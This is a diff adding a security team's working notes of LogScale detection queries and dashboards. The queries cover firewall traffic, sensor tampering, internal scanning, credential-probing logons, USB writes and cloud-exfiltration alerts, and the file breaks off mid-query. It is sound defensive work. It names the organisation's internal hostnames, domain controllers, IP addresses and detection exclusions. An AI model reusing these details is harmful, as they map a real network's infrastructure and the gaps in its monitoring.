+      $ucq-repo-palofirewall()
+      | Type=TRAFFIC                      //only traffic data
+      // make friendly names
+      | case {
+          domain = "TSCPH-CORE-FW-*"      | grpDomain := "TSCPH [Buderim]";                    //BUDERIM
+          domain = "SSHB-CORE-FW-*"       | grpDomain := "SSHB [StStephens]";                  //ST STEPHENS
+          domain = "TWH-CORE-FW-*"        | grpDomain := "TWH [Wesley]";                       //WESLEY
+          domain = "SAW-CORE-FW-*"        | grpDomain := "SAW [StAndrews]";                    //ST ANDREWS
+          domain = "*-*-FW-EXT*"          | grpDomain := "EXTERNAL";                          //EXTERNAL
+          domain = "*-*-FW-INT*"          | grpDomain := "INTERNAL";                          //INTERNAL
+          *                               | grpDomain := "excluded"                           //EXCLUDED
+      }
+      /****************************/
+      // group into 1d sum BytesSent
+      | bucket(
+          span=1d,
+          field=[grpDomain],
+          function=[
+              sum(BytesSent, as=sumBytesSent)
+          ]
+      )
+      // get average and max bucket (this will be todays sum)
+      | groupBy([grpDomain, RuleName],
+          function=[
+              avg(sumBytesSent, as=DailyAverage),                                     // get daily average
+              selectFromMax(field="_bucket", include=[sumBytesSent,grpDomain]),       // get sum last _bucket aka today
+              count(as=DayCount)                                                      // number of days checked for average
+      ])
+      | rename(field=_avg, as=DailyAverage)
+      | rename(field=sumBytesSent, as=DailyTotal)
+      | DailyPercentage := DailyTotal/DailyAverage * 100
+
+      | format("%,.2f", field=DailyPercentage, as=DailyPercentage)
+      | case {
+          DailyPercentage > 150   | icon:="🔴" | status:="CRIT";
+          DailyPercentage > 125   | icon:="🟠" | status:="ALERT";
+          DailyPercentage > 100   | icon:="🟡" | status:="WARN";
+          DailyPercentage < 100   | icon:="🟢" | status:="OK";
+      }
+      | DailyPercentageDiff := 100 - DailyPercentage | format("%.2f", field=DailyPercentageDiff, as=DailyPercentageDiff)
+      | DailyDiff := DailyTotal - DailyAverage | unit:convert(DailyDiff, as="mbDailyDiff", to="M")  | format("%.2f", field=mbDailyDiff, as=mbDailyDiff)
+      | unit:convert(DailyTotal, as="mbDailyTotal", to="M") | format("%.2f", field=mbDailyTotal, as=mbDailyTotal)
+      | unit:convert(DailyAverage, as="mbDailyAverage", to="M") | format("%.2f", field=mbDailyAverage, as=mbDailyAverage)
+      | select(fields=[icon,status,grpDomain,DailyPercentage,DailyPercentageDiff,DayCount,mbDailyAverage,mbDailyTotal,mbDailyDiff])
+    end: now
+    start: 30d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip - firewall taffic comparrisons
+    isLive: false
+    type: query
+  f7541d2f-ce02-440f-8ab1-e9c34232682c:
+    x: 8
+    y: 4
+    height: 4
+    queryString: |-
+      $ucq-repo-crowdstrike()
+      | join({
+          join(
+              {
+                  #event_simpleName = SensorTampering
+                  | triggerEvent := #event_simpleName
+                  | triggerCmd := SourceCommandLine
+              },
+              field=TargetProcessId,
+              key=SourceProcessId,
+              include=[triggerEvent, triggerCmd])
+              },
+          field=TargetProcessId,
+          key=ParentProcessId,
+          include=[triggerEvent, triggerCmd])
+      //| select([@timestamp,ComputerName,Username,triggerEvent,triggerCmd,CommandLine])
+      //| !CommandLine = "sh -c \\u000a        /usr/bin/pkill -HUP falcon-sensor\\u000a logrotate_script /var/log/falcon-sensor.log " //20240627 - AS - log rotation, exclude from alert
+    end: now
+    start: 30d
+    width: 4
+    options:
+      columns:
+      - fieldName: '@timestamp'
+        format: datetime
+        type: field
+        width: 200
+      - groupByPrefix: false
+        header: Field List
+        type: fieldList
+      newestAtBottom: true
+      showOnlyFirstLine: false
+    visualization: list-view
+    title: 'wip sensor tampering '
+    isLive: false
+    type: query
+  e9037fb0-a8b5-43b7-ba65-422888a4d965:
+    x: 0
+    y: 12
+    height: 4
+    queryString: |+
+      //$ucq-repo-crowdstrike()
+      $ucq-repo-palofirewall()
+      //| SourceIP = 10.38.83.27                  //drilldown (also add portService to the groupby so you can see individual ports and their counts)
+      | cidr(field=SourceIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])            //internal ip ranges
+      | cidr(field=DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])       //internal ip ranges
+      | !in(field=DestinationPort, values=[                                                         //excluded ports
+          7680                // windows update delivery optimization
+          , 0                 // port 0?
+      ])
+
+      | portService := format("[%s] %s", field=[DestinationPort, portdescription])
+      | groupBy(field=[SourceIP], function=[
+          count(DestinationPort, as=CountDestPort),
+          count(field=DestinationPort, distinct=true, as=CountDistinctPorts),
+          count(field=DestinationIP, distinct=true, as=CountDistinctIP),
+          collect([DestinationPort], separator=","),
+          collect(portService)
+      ], limit=max)
+      | join(     //get host details from crowdstrike repo
+          query={ #event_simpleName = AdditionalHostInfo }, field=SourceIP, key=LocalAddressIP4, include=[ComputerName,LocalAddressIP4,MachineDn]
+      )
+
+      // exclusions
+      | ComputerName != /UC(Q|C|H)-SVNMID-(P|D)[001|002|003]/i                //servicenow mid controllers
+      | ComputerName != /UCQ-RUMBAG-P[001|002|003]/i                          //runzero servers
+      | ComputerName != /(UC(C|H|Q)-ADCD(1|2)(I|E)-P00(1|2|3)|ADC0[1|2|3|4]BNE0(1|2)|SAURON|DORI|GLAMDRING|NAID|OREAD|SCPH-JASON1|ADC05BNE02|UHC-AD-P001|UCH-SCPHDC-P001)|UC(H|C)-(SS|AD)(ADC|CD(1|2))(I-|-)P00(1|2|3)/i // domain controllers
+      | ComputerName != /UC(H|C)-CXAPP[1-4]-P[0-1](0|1|2|3)\d{1}/i            //citrix
+      | ComputerName != /UCQ-PRINT-(P|T|U)\d{3}/i                             //print servers
+      | ComputerName != /UCQ-XDM-P001|BC-MID-P001|UCQ-SVNMDE-P001|BC-INTMID-P001|UCQ-PWARE-P001|UCQ-SWIPAM-P001|UCQ-USRID2-P001|UCQ-EGMGR-P001/i         //individual devices
+      | ComputerName != /UCQ-DHCP-P00(1|2)/i
+      | ComputerName != /UCH-APP003-P001/i
+      | ComputerName != /UCQ-SOLARW-P001/i                                    //solarwinds
+      | CountDistinctIP > 300
+      | sort(CountDistinctIP)
+      | select(fields=[SourceIP, DestinationIP, portService, CountDestPort, ComputerName, CountDistinctIP])
+
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip interal scanning
+    isLive: false
+    type: query
+  d280bf8f-e73e-4ddb-ac14-5dc24eddeff4:
+    x: 4
+    y: 12
+    height: 4
+    queryString: |-
+      //$ucq-repo-crowdstrike()
+      $ucq-repo-palofirewall()
+      | Type=THREAT //TRAFFIC
+      | domain = /ext/i
+      | !cidr(field=SourceIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]) //not internal ip addresses
+      /*
+      | $qryEnrich-ip(ip=SourceIP) | rename([
+          [aid, srcAid], [ComputerName, srcComputerName],[UserName, srcUserName], [description, srcDescription]
+      ])
+      | $qryEnrich-ip(ip=DestinationIP) | rename([
+          [aid, dstAid], [ComputerName, dstComputerName],[UserName, dstUserName], [description, dstDescription]
+      ])
+      */
+      //| groupBy([SourceIP, DestinationIP, SourceDescription, dstAid, dstComputerName, dstDescription], function=count(as=Count))
+      | ioc:lookup(SourceIP, type=ip_address, confidenceThreshold=unverified, strict=false)
+      | ioc.detected = true
+      | sort(field=Count)
+      | rename(field=[["ioc[0].malicious_confidence", "maliciousConfidence"], ["ioc[0].labels", "iocLabels"]])
+      | case {
+          maliciousConfidence = critical     | icon:="🔴";
+          maliciousConfidence = high         | icon:="🟠";
+          maliciousConfidence = medium       | icon:="🟡";
+          maliciousConfidence = low          | icon:="🟢";
+          maliciousConfidence = *            | icon:="🔵";
+      }
+      | ipLocation(SourceIP)
+      //| match(file="enrich_country.csv", field=SourceIP.country, column="alpha-2")
+      //| groupBy([icon, maliciousConfidence, SourceIP, maliciousConfidence, name, Region, "sub-region"], function=[count(as=Count), collect([iocLabels])])  | sort(Count)
+      //| worldMap(ip=SourceIP)
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip firewall threats
+    isLive: false
+    type: query
+  9c50291b-4b06-4fb2-bd4b-518f6f14b263:
+    x: 0
+    y: 0
+    height: 4
+    queryString: |
+      $ucq-repo-crowdstrike()
+      | #event_simpleName = /InstalledBrowserExtension/i
+      | BrowserExtensionId!="no-extension-available"
+      | !in(field=BrowserExtensionName, values=[
+          "Snow Web Application Metering",
+          "Imprivata OneSign",
+          "Bitwarden Password Manager", "Bitwarden - Free Password Manager",
+          "Google Docs Offline","Sheets","Slides", "Docs", "Gmail", "YouTube",
+          "Edge relevant text changes",
+          "Chrome Web Store Payments",
+          "Windows Accounts",
+          "Adobe Acrobat: PDF edit, convert, sign tools",
+          "Microsoft Single Sign On",
+          "Google Drive"
+      ])
+      | case{
+          BrowserName="3" | BrowserName:="Chrome";
+          BrowserName="4" | BrowserName:="Edge";
+          * | BrowserName:="not chrome or edge";
+      }
+      //| groupby([@timestamp, ComputerName, UserName,#event_simpleName, BrowserFilePath, BrowserExtensionName])
+      //| splitstring(index=-1, by="/\\/i", field=BrowserFilePath, as=browser)
+      | groupBy([BrowserName, BrowserExtensionName], function=[count(), collect([ComputerName], separator=","), collect(UserName, separator=";")], limit=20000) | sort(field=_count)
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip browser plugins
+    isLive: false
+    type: query
+$schema: https://schemas.humio.com/dashboard/v0.23.0
+```
+
+
+
+# dns lookup triggers ioc, gets dhcp, aid details, matches to subnet if it exists and transposes the results for a single view
+
+```sh
+//contains SourceIP,hostname of dhcp registrations
+defineTable(query={
+        $ucq-repo-dhcp()
+        | splitstring(field=@rawstring, as=fields, by=",")
+        | record_id := fields[0]
+        | date := fields[1]
+        | time := fields[2]
+        | message := fields[3]
+        | SourceIP := fields[4]
+        | hostname := fields[5]
+        | length(hostname, as=lenhostname)
+        | lenhostname > 0
+        | groupBy(field=[SourceIP, hostname], limit=max)
+        | drop(fields=[_count])
+}, include=[SourceIP,hostname], name="dhcp", start=30d)
+| $ucq-repo-dns()
+| ioc:lookup(field=fqdn, type=domain, strict=true)
+| ioc.detected = true
+| groupBy(field=["srcipaddress","ioc[0].indicator", "ioc[0].malicious_confidence", "ioc[0].labels", direction, protocol, responsecode])
+| matchOn:=srcipaddress | $ucq-qry-aidFromIP()          //magic to get aid
+| ComputerName != /notfound/i
+| !in(srcipaddress, values=["10.100.104.31", "10.100.104.32", "10.100.105.31", "10.100.105.32"])            
+| rename(field="ioc[0].indicator", as="Indicator")
+| rename(field="ioc[0].malicious_confidence", as="MaliciousConfidence")
+| rename(field="ioc[0].labels", as="Labels")
+// ALERT-OUTPUT
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.datetime", field=@timestamp, timezone="Australia/Brisbane")
+| ucq.sourceip := srcipaddress
+| ucq.indicator := replace(field=Indicator, regex="[.]", replacement="[.]")     //defang it
+| ucq.maliciousconfidence := MaliciousConfidence
+| ucq.count := _count
+| splitString(field=Labels, by=",", as=LabelSplit)
+| ucq.actor := LabelSplit[0]
+| ucq.threattype := LabelSplit[2]
+| match(table=dhcp, field=ucq.sourceip, column=SourceIP)
+| ucq.hostname := hostname
+//| select(fields=[ucq.sourceip, ucq.indicator, ucq.maliciousconfidence, ucq.count, ucq.actor, ucq.threattype, ucq.hostname])
+| drop("LabelSplit[0]", "LabelSplit[1]", "LabelSplit[2]", "LabelSplit[3]", "LabelSplit[4]", "LabelSplit[5]", "LabelSplit[6]", "LabelSplit[7]")
+| match(file="ucq-fle-ips-rumbleSites.json", field=matchOn, column="subnet", mode="cidr", strict=false, include=[*])
+| transpose()
+```
+
+
+
+
+# who's your manager?
+
+based on this but no idea what generates it
+
+`falconUserIdentityContext.csv`
+
+
+```sh
+readFile(file="falconUserIdentityContext.csv")      // read the file, nothing exciting
+| format(format="%s, %s, %s", field=[displayName, "email", "user.active_directory.samaccountname"], as=searchBlob)
+| in(searchBlob, values=?search, ignoreCase=true)
+| rename([
+      ["displayName","UserDisplayName"]
+    , ["user.active_directory.domain", "UserDomain"]
+    , ["user.active_directory.samaccountname", "UserSAM"]
+    , ["email", "UserEmail"]
+    , ["user.active_directory.is_enabled", "UserIsEnabled"]
+    , ["user.active_directory.is_locked", "UserIsLocked"]
+    , ["user.active_directory.sid", "UserSID"]
+    , ["user.active_directory.manager.guid", "ManagerSID"]
+])
+| default(field=[UserIsEnabled, UserIsLocked], value="false", replaceEmpty=true)        // REMOVE THE <empty string> values by setting default values
+/*
+// RELATIONSHIP HERE BETWEEN user.active_directory.guid or user.id = user.active_directory.manager.guid
+| select(fields=[user.email, user.id, user.active_directory.guid, user.active_directory.sid, user.active_directory.manager.guid])
+"user.email",                         "user.id",                              "user.active_directory.guid",           "user.active_directory.sid",                        "user.active_directory.manager.guid"
+"user",         "b6f58ee7-7bb9-4100-b74a-d8cad7f54cba", "b6f58ee7-7bb9-4100-b74a-d8cad7f54cba", "S-1-5-21-1003811068-1371769444-1245840912-52626",  "3473328c-c15d-4f74-993c-40afb0f88617"
+"manager",   "3473328c-c15d-4f74-993c-40afb0f88617", "3473328c-c15d-4f74-993c-40afb0f88617", "S-1-5-21-1003811068-1371769444-1245840912-65179",  "72753f4b-72b0-4317-91d5-2c8442d5083f"
+ */
+| match(file="falconUserIdentityContext.csv", field="ManagerSID", column="user.active_directory.guid", ignoreCase=true, strict=true)
+| rename([ 
+    ["displayName", "ManagerDisplayName"]
+    , ["email", "ManagerEmail"]
+])
+| select(fields=[UserDomain, UserSAM, UserDisplayName, UserEmail, UserIsEnabled, UserIsLocked, ManagerDisplayName, ManagerEmail])
+
+
+
+```
+
+
+
+falcon/helper/mappings.csv
+
+falcon/helper/mappings.csv
+
+
+| match(file="falconUserIdentityContext.csv", field=UserSid, column="user.active_directory.sid", include=[*])
+user.active_directory.manager.guid
+
+
+
+
+
+
+
+
+
+
+
+# dashboard with click through functionality
+
+```
+name: ucq-dsh-PaloFirewalls-ApplicationSearch-Prototype
+updateFrequency: never
+timeSelector: {}
+sharedTimeInterval:
+  enabled: true
+  isLive: false
+  start: 1d
+labels:
+- ucq
+widgets:
+  1ad51973-623b-41da-9827-f7e6df205729:
+    x: 0
+    height: 10
+    queryString: |-
+      $ucq-repo-palofirewall()
+      | Application = ?search
+      | SourceUser != ""
+      | groupby([Application], function=[
+        sum(BytesReceived, as=TBR),
+        sum(BytesSent, as=TBS)
+      ])
+      | unit:convert(TBR, as="MBR", to="M") | format("%.2f", field=MBR, as=TotalMBReceived)
+      | unit:convert(TBS, as="MBS", to="M") | format("%.2f", field=MBS, as=TotalMBSent)
+      | sort(TotalMBReceived)
+      | drop([TBR,MBR,TBS,MBS])
+      | sort(Application, order=asc) | select(Application)
+      //| format("[%s](https://example.com/)", field=Application, as=Application)
+      //| collect([Application], separator=" | ")
+    end: now
+    start: 1d
+    width: 2
+    y: 0
+    interactions:
+    - name: Search
+      useWidgetTimeWindow: true
+      dashboardReference:
+        name: ucq-dsh-PaloFirewalls-ApplicationSearch-Prototype
+      arguments:
+        search: '["{{ fields.Application }}"]'
+      openInNewTab: false
+      type: dashboardlink
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: Applications List
+    isLive: false
+    type: query
+  4a941985-ff04-4fd9-927b-bbbb0a4fb36d:
+    x: 2
+    y: 0
+    height: 3
+    queryString: |-
+      readFile("ucq-fle-palofirewalls-applipedia.csv")
+      | name = ?search
+      | select(Risk, description, CapableofFileTransfer)
+      | transpose()
+      | rename(field=column, as=key)
+    end: now
+    start: 15m
+    width: 10
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: true
+    visualization: table-view
+    title: AppId details
+    isLive: false
+    type: query
+  70526bef-097b-4887-a203-1cec60655ee3:
+    x: 2
+    y: 3
+    height: 10
+    queryString: |-
+      $ucq-repo-palofirewall()
+      | Application = ?search
+      | SourceUser != ""
+      | groupby([Application], function=[
+        sum(BytesReceived, as=TBR),
+        sum(BytesSent, as=TBS)
+      ])
+      | unit:convert(TBR, as="MBR", to="M") | format("%.2f", field=MBR, as=TotalMBReceived)
+      | unit:convert(TBS, as="MBS", to="M") | format("%.2f", field=MBS, as=TotalMBSent)
+      | sort(TotalMBReceived)
+      | drop([TBR,MBR,TBS,MBS])
+    end: now
+    start: 1d
+    width: 5
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: Application
+    isLive: false
+    type: query
+  a5e45f63-b1ab-4365-b744-5f444ecf2312:
+    x: 7
+    y: 3
+    height: 10
+    queryString: |-
+      $ucq-repo-palofirewall()
+      | Application = ?search
+      | SourceUser != ""
+      | groupby([SourceUser,Application], limit=500, function=[
+        sum(BytesReceived, as=TBR),
+        sum(BytesSent, as=TBS)
+      ])
+      | unit:convert(TBR, as="MBR", to="M") | format("%.2f", field=MBR, as=TotalMBReceived)
+      | unit:convert(TBS, as="MBS", to="M") | format("%.2f", field=MBS, as=TotalMBSent)
+      | sort(TotalMBReceived)
+      | drop([TBR,MBR,TBS,MBS])
+    end: now
+    start: 1d
+    width: 5
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: GroupBy SourceUser
+    isLive: false
+    type: query
+$schema: https://schemas.humio.com/dashboard/v0.23.0
+parameters:
+  search:
+    label: search
+    order: 50
+    type: text
+    defaultValue: '*'
+    width: 1
+
+
+```
+
+
+
+
+# first detect
+
+```sh
+$ucq-repo-palofirewall()
+| ApplicationSubCategory="file-sharing"
+| SourceUser=* and SourceUser != ""
+| !cidr(field=DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12 ","192.168.0.0/16"])      //exclude internal destinations
+| !in(field=Application, values=["sharefile-base","*onedrive-business*"])                   //sharefile-base and onedrive-business are approved
+| groupBy([SourceUser, Application], function=[sum(BytesSent, as=totalBytesSent)
+    , min(@timestamp, as=Started)
+    , max(@timestamp, as=Finished)
+    ], limit=200000)
+    
+
+| unit:convert(totalBytesSent, as="totalMBytesSent", to="M") | format("%.2f", field=totalMBytesSent, as=totalMBytesSent)
+
+// ALERT NORMALISE
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.firstDetection", field=Started, timezone="Australia/Brisbane")
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.lastDetection", field=Finished, timezone="Australia/Brisbane")
+| rename([
+  [SourceUser, ucq.username],
+  [Application, ucq.cloudservice],
+  [totalMBytesSent, ucq.sentmb]
+])
+// ALERT TRIGGERS
+| ucq.sentmb >= 50
+// ALERT EXCLUSIONS
+//| !(ucq.computername = /^ucl-112233$/i AND ucq.username = /^test$/i)         // 20260128 adams example
+// ALERT SUMMARIZE ONLY INCLUDE ucq. FIELDS
+
+| drop(fields=[totalBytesSent, Started, Finished])
+
+
+```
+
+# reverse join
+
+```
+
+#repo=mimecast
+| case {
+    in(field="Vendor.senderHeader", values=?search, ignoreCase=true) ;
+    in(field="Vendor.senderEnvelope", values=?search, ignoreCase=true) ;
+    in(field="Vendor.recipient", values=?search, ignoreCase=true) ;
+}
+| lower(Vendor.senderHeader, as=cleanedLoweredEmail)
+| join({
+    readFile(file="falconUserIdentityContext.csv")
+    | lower(accountEmail, as=cleanedLoweredEmail)
+    | rename([
+        ["displayName", "accountName"],
+        ["user.email", "accountEmail"],
+        ["user.active_directory.domain", "domain"],
+        ["user.active_directory.samaccountname", "sam"],
+        ["user.active_directory.is_enabled", "Enabled"],
+        ["user.active_directory.is_locked", "Locked"],
+        ["user.active_directory.is_password_compromised", "Compromised"],
+        ["user.active_directory.last_activity_date", "lastActivityDate"],
+        ["user.is_privileged", "Privileged"],
+        ["user.is_watched", "Watched"],
+        ["user.active_directory.manager.guid", "ManagerSID"]
+    ])
+    | format(format="%s, %s, %s", field=[accountName, cleanedLoweredEmail, sam], as=searchBlob)
+    | in(searchBlob, values=?search, ignoreCase=true)
+    | cleanedLoweredEmail != ""
+    | select([cleanedLoweredEmail, accountName, domain, sam, Enabled, Locked, Compromised, lastActivityDate, Privileged, Watched, ManagerSID])
+}, field=cleanedLoweredEmail, mode="left", include=[accountName, domain, sam, Enabled, Locked, Compromised, lastActivityDate, Privileged, Watched, ManagerSID])
+
+| groupBy(field=[#event.dataset, Enabled, @timestamp, Vendor.direction, Vendor.senderHeader, Vendor.senderEnvelope, Vendor.subject, Vendor.recipients])  //function=[collect(Vendor.recipients)], limit=max
+
+```
+
+
+# credential scanning
+
+```
+
+#repo="base_sensor"
+| case {
+    #event_simpleName="UserLogonFailed2" | user.name := UserName | _victim_ip := LocalAddressIP4 | _domain_ := LogonDomain | attacker_host := RemoteAddressIP4 | _logon_failed_1 := true;
+    #event_simpleName="ActiveDirectoryServiceAccessRequestFailure" | user.name := SourceAccountSamAccountName | _victim_ip := TargetServerAddressIP4 | _domain_ := SourceAccountDomain | _logon_failed_2 := true;
+}
+// ##################################################3
+| _domain_ := lower(_domain_)
+| user.name := lower(user.name)
+
+| selfJoinFilter(field=[_domain_, _victim_ip],
+    where=[
+        { _logon_failed_1="true" },
+        { _logon_failed_2="true" }
+    ]
+)
+/*
+// ##################################################3
+| case {
+    ActiveDirectoryAuthenticationMethod=0 | _auth_method_ := "Kerberos";
+    ActiveDirectoryAuthenticationMethod=3 | _auth_method_ := "SIMPLE BIND";
+    in(field="ActiveDirectoryAuthenticationMethod", values=[1,2,5]) | _auth_method_ := "NTLM";
+    *;
+}
+// ##################################################3
+| case { 
+    ActiveDirectoryDataProtocol=0 | _protocol_ := "LDAP"; 
+    ActiveDirectoryDataProtocol=1 | _protocol_ := "DCE_RPC";
+    ActiveDirectoryDataProtocol=2 | _protocol_ := "RDP";
+    in(field="ActiveDirectoryDataProtocol", values=[3,4,5,6,7,8,9]) | _protocol_ := "SMB";
+    *;
+}
+// ##################################################3
+| case{
+    TargetServiceAccessClassification=1 | _target_service_ := "LDAP";
+    TargetServiceAccessClassification=2 | _target_service_ := "WEB";
+    TargetServiceAccessClassification=3 | _target_service_ := "FILE_SHARE";
+    TargetServiceAccessClassification=4 | _target_service_ := "DB";
+    TargetServiceAccessClassification=5 | _target_service_ := "RPCSS";
+    TargetServiceAccessClassification=6 | _target_service_ := "REMOTE_DESKTOP";
+    TargetServiceAccessClassification=7 | _target_service_ := "SCCM";
+    TargetServiceAccessClassification=8 | _target_service_ := "SIP";
+    TargetServiceAccessClassification=9 | _target_service_ := "DNS";
+    TargetServiceAccessClassification=10 | _target_service_ := "MAIL";
+    TargetServiceAccessClassification=11 | _target_service_ := "COMPUTER_ACCESS";
+    TargetServiceAccessClassification=12 | _target_service_ := "SERVICE_ACCOUNT";
+    TargetServiceAccessClassification=13 | _target_service_ := "UNKNOWN";
+    *;
+}
+// ##################################################3
+ */
+
+
+/*
+| groupby([_victim_ip, _domain_],
+    function=[
+        collect([event_platform, attacker_host, _target_service_, _auth_method_, _protocol_]),
+        count(SourceAccountUserName, distinct=true, as="distictUserNameCnt"),
+        sum(AggregationActivityCount, as="distictAttemptsCnt")
+    ]
+)
+// Tune the detection based on your environment activity
+| distictUserNameCnt > 15 OR distictAttemptsCnt > 20
+ */
+//| select([event_platform, attacker_host, _target_service_, _auth_method_, _protocol_])
+| formatTime(format="%Y/%m/%d %H:%M:%S ", as="timestamp", field=@timestamp, timezone="Australia/Brisbane")
+| select([timestamp, SourceEndpointHostName, SourceEndpointAddressIP4, SourceAccountUserName, TargetServerHostName, TargetServerAddressIP4, error.code])
+| drop(@rawstring) | SourceEndpointHostName=* SourceEndpointAddressIP4=*| error.code = "STATUS_NO_SUCH_USER"
+| groupBy([SourceEndpointHostName])
+
+```
+
+
+
+
+# drill down on usbs written to disk
+
+```
+// ALERT
+$ucq-repo-crowdstrike()
+| #event_simpleName=/FileWritten$/ 
+| ((event_platform=Win DiskParentDeviceInstanceId="USB*") OR (event_platform=Mac IsOnRemovableDisk=1))
+| case {
+    match(file="ucq-fle-ad-groupusers.csv", field=UserName, column=Name, include=[group]) | authorised:=true | group:=group;
+    * | authorised:=false | group:="-"
+}
+| in(ComputerName, values=["UCD-3LF6L94","UCL-CPXY3J3","UCL-9Y2BSV3","UCL-B75VSV3","UCL-6VJJ1B4","UCD-5P8VSH3","UCD-DL8VSH3","UCL-D4ZFQV3","UCD-GQ8VSH3","UCD-GPGC7F3","UCL-6ZF16J3","UCL-G6PSSV3","UCD-DG59BW2"])
+| formatTime(format="%Y/%m/%d %H:%M:%S ", as="timestamp", field=@timestamp, timezone="Australia/Brisbane")
+| select(fields=[timestamp, UserName, ComputerName, authorised, group, Size, TargetFileName])
+```
+
+
+
+
+
+
+
+
+# quick hits
+
+
+//| formatTime(format="%Y/%m/%d %H:%M:%S ", as="readabledate", field=@timestamp, timezone="Australia/Brisbane")
+
+
+
+
+# mailto inside notification email
+
+```
+/*
+$ucq-repo-palofirewall()
+| ApplicationSubCategory="file-sharing"
+| SourceUser=* and SourceUser != ""
+| !cidr(field=DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12 ","192.168.0.0/16"])      //exclude internal destinations
+| !in(field=Application, values=["sharefile-base","*onedrive-business*"])                   //sharefile-base and onedrive-business are approved
+| groupBy([SourceUser, Application], function=[sum(BytesSent, as=totalBytesSent)
+    , min(@timestamp, as=Started)
+    , max(@timestamp, as=Finished)
+    ], limit=200000)
+    
+
+| unit:convert(totalBytesSent, as="totalMBytesSent", to="M") | format("%.2f", field=totalMBytesSent, as=totalMBytesSent)
+
+// ALERT NORMALISE
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.firstDetection", field=Started, timezone="Australia/Brisbane")
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.lastDetection", field=Finished, timezone="Australia/Brisbane")
+| rename([
+  [SourceUser, ucq.username],
+  [Application, ucq.cloudservice],
+  [totalMBytesSent, ucq.sentmb]
+])
+// ALERT TRIGGERS
+| ucq.sentmb >= 50
+// ALERT EXCLUSIONS
+//| !(ucq.computername = /^ucl-112233$/i AND ucq.username = /^test$/i)         // 20260128 adams example
+// ALERT SUMMARIZE ONLY INCLUDE ucq. FIELDS
+
+| drop(fields=[totalBytesSent, Started, Finished])
+*/
+
+$ucq-repo-palofirewall()
+| ApplicationSubCategory="file-sharing"
+| SourceUser=* and SourceUser != ""
+| !cidr(field=DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12 ","192.168.0.0/16"])      //exclude internal destinations
+| !in(field=Application, values=["sharefile-base","*onedrive-business*"])                   //sharefile-base and onedrive-business are approved
+| groupBy([SourceUser, Application], function=[sum(BytesSent, as=totalBytesSent)
+    , min(@timestamp, as=Started)
+    , max(@timestamp, as=Finished)
+    ], limit=200000)
+| unit:convert(totalBytesSent, as="totalMBytesSent", to="M") | format("%.2f", field=totalMBytesSent, as=totalMBytesSent)
+// ALERT NORMALISE
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.firstDetection", field=Started, timezone="Australia/Brisbane")
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="ucq.lastDetection", field=Finished, timezone="Australia/Brisbane")
+| splitString(field=SourceUser, by="\\\\", as="tmpSourceUser")
+| "user.active_directory.samaccountname":= lower(tmpSourceUser[1])
+| tmpDomain:= lower(field=tmpSourceUser[0])
+//| select([tmpDomain, tmpUser])
+| case {
+    tmpDomain="uhc"       | "user.active_directory.domain":="uhc.uc.com.au";
+    tmpDomain="lccq"      | "user.active_directory.domain":="lccq.org.au";
+    tmpDomain="uc"        | "user.active_directory.domain":="uc.com.au";
+    tmpDomain="int"       | "user.active_directory.domain":="ext.ucq.com.au";
+    tmpDomain="ext"       | "user.active_directory.domain":="uhc.uc.com.au";
+    tmpDomain="bluecare"  | "user.active_directory.domain":="qld.bluecare.org.au";
+}
+| match(file="falconUserIdentityContext.csv", ignoreCase=true, field=["user.active_directory.domain", "user.active_directory.samaccountname"], column=["user.active_directory.domain", "user.active_directory.samaccountname"])
+// ALERT TRIGGERS
+| totalMBytesSent >= 50
+// ALERT EXCLUSIONS
+//| !(ucq.computername = /^ucl-112233$/i AND ucq.username = /^test$/i)         // 20260128 adams example
+// ALERT SUMMARIZE ONLY INCLUDE ucq. FIELDS
+//| format("[Identity Protection](https://falcon.us-2.crowdstrike.com/identity-protection/entities/%s)", field=user.active_directory.guid, as=IdentityProtection)
+| rename([
+    [SourceUser, ucq.username],
+    [Application, ucq.cloudservice],
+    [totalMBytesSent, ucq.sentmb]
+])
+| mailTarget:="cyber@ucareqld.com.au"
+| format(format="[TEST-LINK](mailto:%s?subject=[ALERT:High] Exfiltration Via Cloud&body=Our monitoring controls have flagged an unusual data transfer from %s, an %s from %s. Approximately %s MB of data has been copied to a personal %s account.\n\nThe data was transferred between %s and %s)", field=[mailTarget, displayName, user.title, user.department, ucq.sentmb, ucq.cloudservice, ucq.firstDetection, ucq.lastDetection], as=ucq.mailLink)
+//| drop(fields=[totalBytesSent, Started, Finished])
+| select(fields=[ucq.cloudservice, ucq.firstDetection, ucq.lastDetection, ucq.sentmb, ucq.username, ucq.mailLink])
+
+
+
+
+```
+
+
+
+# 
+
+
+```
+#repo="base_sensor"
+| case {
+    // filter | set user.name = BOB | set _victim_ip = 1.1.1.1 | set _domain_ = boogle.com | etc
